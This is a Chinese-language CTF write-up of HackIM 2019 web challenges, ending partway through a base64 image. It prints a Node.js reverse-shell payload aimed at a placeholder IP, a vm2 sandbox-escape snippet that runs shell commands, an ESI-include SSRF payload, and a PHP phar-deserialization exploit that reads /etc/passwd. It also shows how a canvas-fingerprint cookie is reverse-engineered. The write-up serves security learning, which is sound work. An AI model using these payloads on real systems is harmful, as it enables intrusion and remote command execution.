# HackIM 2019 Web记录

阅读量 **554769**

|评论 **6**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-14 15:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

过年前做了一下，感觉还是挺有意思的。比赛官方也开源了[比赛源码](https://github.com/nullcon/hackim-2019)。

## Web

###  BabyJS

> ​ Run your javascript code inside this page and preview it because of
> hackers we have only limited functions

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwktzddltj21fy17wgq2.jpg)

题目内容如上，比较简单的 javascript 代码运行，后台是 Node.js

这里我们可以考虑一下是不是有什么 Node.js 沙箱逃逸什么的操作，国内对于 Node.js
沙箱逃逸的文章还是比较少的，参考了好几篇都是翻译文章，都翻译得不是很清楚，参考文章：[NodeJS沙盒逃逸研究](http://www.4hou.com/web/14837.html)

但是也能知道个大概，要执行命令或者反弹 shell 就需要用到两个模块，分别是 net 和 child_process ，可以用以下 payload
直接反弹 shell

    
    
    (function () {
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(your_port, "your_ip", function () {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();
    

然而当我们想直接反弹 shell （那当然是太天真了），就返回了`not defined`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwlmelzetj21g0084wg1.jpg)

所以没那么简单，那我们先从信息收集开始，使用`Error().stack`可以收集使用的模块信息，而且题目设置是可以直接把内容输出出来的，所以我们不需要`print`，可以直接输出信息。

我们首先先收集目标信息，使用`js=Error().stack`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwl9aze8nj217i0eiq7k.jpg)

我们可以得到题目设置的模块，如`vm.js`，然后发现对应的[vm2](https://github.com/patriksimek/vm2)仓库里已经有很多
escape 的 issue 了，发现有一位 [@XmiliaH](https://github.com/XmiliaH "@XmiliaH") 大佬已经
escape 了很多版本，我们可以尝试一下比较新的一个版本[Breakout in
v3.6.9](https://github.com/patriksimek/vm2/issues/186)

    
    
    var process;
    try{
    Object.defineProperty(Buffer.from(""),"",{
        value:new Proxy({},{
            getPrototypeOf(target){
                if(this.t)
                    throw Buffer.from;
                this.t=true;
                return Object.getPrototypeOf(target);
            }
        })
    });
    }catch(e){
        process = e.constructor("return process")();
    }
    process.mainModule.require("child_process").execSync("ls").toString()
    

直接作为 payload 使用，发现可以成功执行命令

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwush1k8sj21uu0e4n01.jpg)

接下来直接读 flag 就好了，得到

    
    
    hackim19{S@ndbox_0_h4cker_1}
    

###  Blog

> ​ Its just a blog

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwv3ae5okj21b20l475a.jpg)

题目是一个 Node.js ，题目设置比较简单，就一个表单，提交之后参数会得到相应的页面

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwv45ywjkj214y0nw0tt.jpg)

以及还有一个 admin 界面

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwv52lp3jj217m0nmwfm.jpg)

index 界面输入什么就以 HTML 形式返回什么，也可以触发 XSS

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwv9vpdkbj21ey0nignc.jpg)

但是这只是一个 self-xss ，这就显得又些鸡肋了，所以大概意思就是我们需要用 index 做 xss 或者其他一些操作去获取管理员权限

跟上题一样，既然都是 Node.js ，是不是也可以得到一些错误信息什么的。

在尝试了一些单引号、双引号等一些特殊符号，发现确实是全部都转换成 string
输出了，猜想是不是有类似`toString()`的操作，换成数组测试，发现无回显，一直停留在 pending 状态中

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwvhyygmfj21080pa401.jpg)

尝试直接访问 /edge 页面，得到错误信息

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwvixv0itj21au0kmtct.jpg)

但是这都是用于前端效果的 js 库，并没有什么用，但是思路应该是没错的，继续 fuzz 就行了。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzwvz15rdaj21cm0neaef.jpg)

最终用`title=1&description[a]=1`得到了比较有用的报错信息，得到了一个新的库 esi.js ，查看相关资料[Node ESI
Language parser](https://www.npmjs.com/package/esi)，可以知道这是一个用于处理 ESI 语言的 js
库，使用示例官方也给出来了

> ​ You want to embed the fragment of HTML from
> “<http://snipets.com/abc.html>“ within an HTML document.
>  
>  
>     blah blah, oh and here i embed in the page a snipet using an ESI server
> ...
>     <esi:include src="http://snipets.com/snipet.html"></esi:include>
>  
>
> **snipet.html**
>  
>  
>     <b>Snipet</b>
>  
>
> With Node ESI script, you can pre-process ESI tags.

看到这里我们的思路就比较清晰，就是以 esi 的方式去访问 admin 页面就可以了，相当于形成了一个 SSRF 。

    
    
    payload:
    title=1&description=<esi%3Ainclude+src%3D"http%3A%2F%2Fwebsite.com%2Fadmin"><%2Fesi%3Ainclude>
    

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzx6f4tdelj21y40nqdi0.jpg)

###  mime checkr

> ​ upload and check the mime type
>
> Hint1: Do you think containers could speak like humans?

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzxu7pv2x6j228014mdjz.jpg)

题目设置为有一个上传点，只允许上传 .jpeg 后缀的文件，尝试了一下其他截断，均不能上传其他文件

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzxud8xetwj21yo1887fz.jpg)

还有一个获取 MIME 格式的功能，需要传入路径，返回 MIME 格式

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzxuea3691j21yq18e11u.jpg)

还有一个备份文件`getmime.bak`

    
    
    <?php
    //error_reporting(-1);
    //ini_set('display_errors', 'On');
    
    class CurlClass{
        public function httpGet($url) {
        $ch = curl_init();  
    
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    //  curl_setopt($ch,CURLOPT_HEADER, false); 
    
        $output=curl_exec($ch);
    
        curl_close($ch);
        return $output;
     }
    }
    
    
    class MainClass {
    
        public function __destruct() {
            $this->why =new CurlClass;
            echo $this->url;
            echo $this->why->httpGet($this->url);
        }
    }
    
    
    // Check if image file is a actual image or fake image
    if(isset($_POST["submit"])) {
        $check = getimagesize($_POST['name']);
        if($check !== false) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    }
    
    
    ?>
    

看到备份文件中有`_destruct`与`curl`，思路也就比较清晰了，大致需要我们上传一个 phar
文件，然后用`phar://xx/xx`去触发反序列化漏洞。

这里我先测试`file:///etc/passwd`，用以下代码生成 phar 文件

    
    
    <?php
    
    class CurlClass
    {
        public function httpGet($url)
        {
            $ch = curl_init();
    
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //  curl_setopt($ch,CURLOPT_HEADER, false); 
    
            $output = curl_exec($ch);
    
            curl_close($ch);
            return $output;
        }
    }
    
    
    class MainClass
    {
    
        public function __destruct()
        {
            $this->why = new CurlClass;
            echo $this->url;
            echo $this->why->httpGet($this->url);
        }
    }
    
    $phar = new Phar("zedd.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new MainClass();
    $o->url = "file:///etc/passwd";
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); 
        //签名自动计算
    $phar->stopBuffering();
    ?>
    

修改后缀名为 .jpeg
，通过访问`phar://uploads/f68caba0b9.jpeg/test.txt`，成功获得了`file:///etc/passwd`的内容。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy0mvluz9j21z217idsb.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy0ikwngnj228016ix0e.jpg)

但是我们如何找 flag 呢，这里其实是比较坑的一个点，其实基本漏洞利用点已经找到了，接下来其实感觉是有些多余的出题设置，通过试探一些常用的 flag
目录路径，都没有找到 flag ，而后在`/etc/hosts`发现了同一个网段的另一台主机。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy1oozdb0j21ys17g7eb.jpg)

如图中的`192.168.32.2 7eaef799a0b8`，猜想是不是在 192.168.32.0/24 这个段上，或者比较靠前的机器上，当尝试到
192.168.32.3 时，发现有不寻常的返回。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy1rbpxh6j21yu172ti8.jpg)

看着有点像用 python 加密出来的东西，搜了一下发现是使用了一个叫`ebcdic`的 python 库，用了`cp1047`编码。

解码脚本：

    
    
    import ebcdic
    blob=b'xc8x85x93x93x96@ax86x85xa3x83x88xa1lxadxbd_|]M@@x94x85'
    print(blob.decode("cp1047"))
    

得到`Hello /fetch~%[]^@)( me`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy1xwc88xj20xq08i7cq.jpg)

感觉是个 url 之类的，再构造 phar 包，访问 `http://192.168.32.3/fetch~%25%5B%5D%5E%40)(`，得到

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy22v3ipzj21yk16qaji.jpg)

看起来是同样的加密，直接解密就可以了。

    
    
    import ebcdic
    blob=b'xc6x93x81x87xc0xd7xc8xd7mxe2xa3x99x85x81x94xa2mx81x99x85mxa3xf0xf0mxd4x81x89x95xe2xa3x99x85x81x94xf0xd0'
    print(blob.decode("cp1047"))
    

最后得到 flag

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzy21l6spgj21ms0cgwxi.jpg)

###  credz

> ​ Alice is a admin of abc company in india. He knows about hackers and makes
> a system that can login only from his system and only his browser which is
> chrome.
>
>   * Hint: ummm maybe that image has something to do with it.
>   * Hint2: Admin is uses fresh chrome
>   * Hint3: admin has different CanvasFingerprint
>   * Hint4: Windows 10 64 bit
>

题目设置为一个登陆界面，并且有一行注释

    
    
    <!-- remember me all the time, credz is not what you need luke -->
    

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyb3plxioj227w14kdj9.jpg)

尝试了一下 sql 注入，并没有注入点，在尝试弱密码的时候使用`admin/admin`登录成功，但是页面提示

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyb5b5kisj217u08m0tj.jpg)

很直接，让我们伪造 admin 的 cookie ，这就需要我们另寻突破口了，在主页面发现一个貌似用来设置 cookie 的 js 文件：

Fps.js

    
    
    (function(name, context, definition) {
        if (typeof module !== 'undefined' && module.exports) {
            module.exports = definition()
        } else if (typeof define === 'function' && define.amd) {
            define(definition)
        } else {
            context[name] = definition()
        }
    })('fpbrowser_v1', this, function() {
        'use strict';
        var Fingerprint = function(options) {
            var nativeForEach, nativeMap;
            nativeForEach = Array.prototype.forEach;
            nativeMap = Array.prototype.map;
            this.each = function(obj, iterator, context) {
                if (obj === null) {
                    return
                }
                if (nativeForEach && obj.forEach === nativeForEach) {
                    obj.forEach(iterator, context)
                } else if (obj.length === +obj.length) {
                    for (var i = 0, l = obj.length; i < l; i++) {
                        if (iterator.call(context, obj[i], i, obj) === {}) return
                    }
                } else {
                    for (var key in obj) {
                        if (obj.hasOwnProperty(key)) {
                            if (iterator.call(context, obj[key], key, obj) === {}) return
                        }
                    }
                }
            };
            this.map = function(obj, iterator, context) {
                var results = [];
                if (obj == null) return results;
                if (nativeMap && obj.map === nativeMap) return obj.map(iterator, context);
                this.each(obj, function(value, index, list) {
                    results[results.length] = iterator.call(context, value, index, list)
                });
                return results
            };
            if (typeof options == 'object') {
                this.hasher = options.hasher;
                this.screen_resolution = options.screen_resolution;
                this.screen_orientation = options.screen_orientation;
                this.canvas = options.canvas;
                this.ie_activex = options.ie_activex
            } else if (typeof options == 'function') {
                this.hasher = options
            }
        };
        Fingerprint.prototype = {
            get: function() {
                var keys = [];
                keys.push(navigator.userAgent);
                keys.push(navigator.language);
                keys.push(screen.colorDepth);
                if (this.screen_resolution) {
                    var resolution = this.getScreenResolution();
                    if (typeof resolution !== 'undefined') {
                        keys.push(resolution.join('x'))
                    }
                }
                keys.push(new Date().getTimezoneOffset());
                keys.push(this.hasSessionStorage());
                keys.push(this.hasLocalStorage());
                keys.push(!!window.indexedDB);
                if (document.body) {
                    keys.push(typeof(document.body.addBehavior))
                } else {
                    keys.push(typeof undefined)
                }
                keys.push(typeof(window.openDatabase));
                keys.push(navigator.cpuClass);
                keys.push(navigator.platform);
                keys.push(navigator.doNotTrack);
                keys.push(this.getPluginsString());
                if (this.canvas && this.isCanvasSupported()) {
                    keys.push(this.getCanvasFingerprint())
                }
                if (this.hasher) {
                    return this.hasher(keys.join('###'), 31)
                } else {
                    return this.fingerprint_js_browser(keys.join('###'), 31)
                }
            },
            fingerprint_js_browser: function(key, seed) {
                var remainder, bytes, h1, h1b, c1, c2, k1, i;
                remainder = key.length & 3;
                bytes = key.length - remainder;
                h1 = seed;
                c1 = 0xcc9e2d51;
                c2 = 0x1b873593;
                i = 0;
                while (i < bytes) {
                    k1 = ((key.charCodeAt(i) & 0xff)) | ((key.charCodeAt(++i) & 0xff) << 8) | ((key.charCodeAt(++i) & 0xff) << 16) | ((key.charCodeAt(++i) & 0xff) << 24);
                    ++i;
                    k1 = ((((k1 & 0xffff) * c1) + ((((k1 >>> 16) * c1) & 0xffff) << 16))) & 0xffffffff;
                    k1 = (k1 << 15) | (k1 >>> 17);
                    k1 = ((((k1 & 0xffff) * c2) + ((((k1 >>> 16) * c2) & 0xffff) << 16))) & 0xffffffff;
                    h1 ^= k1;
                    h1 = (h1 << 13) | (h1 >>> 19);
                    h1b = ((((h1 & 0xffff) * 5) + ((((h1 >>> 16) * 5) & 0xffff) << 16))) & 0xffffffff;
                    h1 = (((h1b & 0xffff) + 0x6b64) + ((((h1b >>> 16) + 0xe654) & 0xffff) << 16))
                }
                k1 = 0;
                switch (remainder) {
                    case 3:
                        k1 ^= (key.charCodeAt(i + 2) & 0xff) << 16;
                    case 2:
                        k1 ^= (key.charCodeAt(i + 1) & 0xff) << 8;
                    case 1:
                        k1 ^= (key.charCodeAt(i) & 0xff);
                        k1 = (((k1 & 0xffff) * c1) + ((((k1 >>> 16) * c1) & 0xffff) << 16)) & 0xffffffff;
                        k1 = (k1 << 15) | (k1 >>> 17);
                        k1 = (((k1 & 0xffff) * c2) + ((((k1 >>> 16) * c2) & 0xffff) << 16)) & 0xffffffff;
                        h1 ^= k1
                }
                h1 ^= key.length;
                h1 ^= h1 >>> 16;
                h1 = (((h1 & 0xffff) * 0x85ebca6b) + ((((h1 >>> 16) * 0x85ebca6b) & 0xffff) << 16)) & 0xffffffff;
                h1 ^= h1 >>> 13;
                h1 = ((((h1 & 0xffff) * 0xc2b2ae35) + ((((h1 >>> 16) * 0xc2b2ae35) & 0xffff) << 16))) & 0xffffffff;
                h1 ^= h1 >>> 16;
                return h1 >>> 0
            },
            hasLocalStorage: function() {
                try {
                    return !!window.localStorage
                } catch (e) {
                    return true
                }
            },
            hasSessionStorage: function() {
                try {
                    return !!window.sessionStorage
                } catch (e) {
                    return true
                }
            },
            isCanvasSupported: function() {
                var elem = document.createElement('canvas');
                return !!(elem.getContext && elem.getContext('2d'))
            },
            isIE: function() {
                if (navigator.appName === 'Microsoft Internet Explorer') {
                    return true
                } else if (navigator.appName === 'Netscape' && /Trident/.test(navigator.userAgent)) {
                    return true
                }
                return false
            },
            getPluginsString: function() {
                if (this.isIE() && this.ie_activex) {
                    return this.getIEPluginsString()
                } else {
                    return this.getRegularPluginsString()
                }
            },
            getRegularPluginsString: function() {
                return this.map(navigator.plugins, function(p) {
                    var mimeTypes = this.map(p, function(mt) {
                        return [mt.type, mt.suffixes].join('~')
                    }).join(',');
                    return [p.name, p.description, mimeTypes].join('::')
                }, this).join(';')
            },
            getIEPluginsString: function() {
                if (window.ActiveXObject) {
                    var names = ['ShockwaveFlash.ShockwaveFlash', 'AcroPDF.PDF', 'PDF.PdfCtrl', 'QuickTime.QuickTime', 'rmocx.RealPlayer G2 Control', 'rmocx.RealPlayer G2 Control.1', 'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)', 'RealVideo.RealVideo(tm) ActiveX Control (32-bit)', 'RealPlayer', 'SWCtl.SWCtl', 'WMPlayer.OCX', 'AgControl.AgControl', 'Skype.Detection'];
                    return this.map(names, function(name) {
                        try {
                            new ActiveXObject(name);
                            return name
                        } catch (e) {
                            return null
                        }
                    }).join(';')
                } else {
                    return ""
                }
            },
            getScreenResolution: function() {
                var resolution;
                if (this.screen_orientation) {
                    resolution = (screen.height > screen.width) ? [screen.height, screen.width] : [screen.width, screen.height]
                } else {
                    resolution = [screen.height, screen.width]
                }
                return resolution
            },
            getCanvasFingerprint: function() {
                var canvas = document.createElement('canvas');
                var ctx = canvas.getContext('2d');
                var txt = 'I am not admin';
                ctx.textBaseline = "top";
                ctx.font = "12.5px 'Arial'";
                ctx.textBaseline = "numeric";
                ctx.fillStyle = "#f60";
                ctx.fillRect(101, 5, 48, 30);
                ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15);
                ctx.fillStyle = "rgba(111, 177, 0.1, 0.7)";
                ctx.fillText(txt, 4, 17);
                return canvas.toDataURL()
            }
        };
        return Fingerprint
    });
    
    function bjs_1(e) {
        var r = new fpbrowser_v1,
            t = new fpbrowser_v1({
                canvas: !0
            }),
            n = r.get(),
            o = t.get(),
            i = n + "" + o,
            a = getbrowser(),
            d = new XMLHttpRequest,
            s = "trackuser.php",
            w = "m=" + i;
        w += "&token=" + e, w += "&b=" + a, d.open("POST", s, !0), d.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), d.onreadystatechange = function() {
            if (4 == d.readyState && 200 == d.status) {
                d.responseText;
                "index.php" == e && (document.getElementById("loaderDiv").innerHTML = "")
            }
        }, d.send(w)
    }
    
    function getbrowser() {
        var e = !!window.opr && !!opr.addons || !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
        if (e) return "Opera";
        var r = "undefined" != typeof InstallTrigger;
        if (r) return "FireFox";
        var t = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
        if (t) return "Safari";
        var n = !1 || !!document.documentMode;
        if (n) return "IE";
        var o = !n && !!window.StyleMedia;
        if (o) return "Edge";
        var i = !!window.chrome && !!window.chrome.webstore;
        return i ? "Chrome" : "other Browser"
    }
    

大致进行了一波审计，从`index.html`中含有的`<script> var i='index.html'; bjs_1(i);
</script>`开始，发现`bjs_l()`函数，并且可以抓到请求`trackuser.php`的包

    
    
    POST /trackuser.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: http://localhost/
    Content-type: application/x-www-form-urlencoded
    Content-Length: 49
    Connection: close
    Cookie: continueCode=PJgGlaHKhetvcbIlToCVsZFLinSyHZuQcgCJfZSbuphvCV9slmH6ET5v08yK; cookieconsent_status=dismiss; PHPSESSID=877d4hrk97pg1qbnpb37sejqh7
    Cache-Control: max-age=0
    
    m=36743815193629702779&token=index.html&b=FireFox
    

跟进`bjs_l()`函数，发现初始化了两个`fpbrowser_v1`类，并且调用了`get()`函数返回值作为 ajax 请求中 m 的 value
值，关键就在`Fingerprint.prototype`这里的`get`函数，这里用`keys`数组存储了一系列的参数，但是其实主要的只是以下几个，因为其他参数我们完全可以直接用
windows 10 装一个最新的 chrome 来模拟环境，就不需要完全修改参数了

  * navigator.language — 题目设置已经告诉我们 “Alice is a admin of abc company in india”
  * navigator.userAgent — 题目 hint 给出 windows 10 chrome
  * getTimezoneOffset() — India 的时区
  * getCanvasFingerprint

大致就是以上因素，我们可以从 hint 中找到大部分的参数，设置`navigator.language`可以用 india 的 language
解决，`getTimezoneOffset`我们可以算得到是-300，唯独`getCanvasFingerprint`我们不太清楚，经过仔细查阅资料知道这个实现的就是`Canvas
Fingerprinting`，而题目中那个注释以及 hint 也给出了，应该就是用 `index.html`中的那个`canvas`图片

    
    
    <img src="data:image/png;base64,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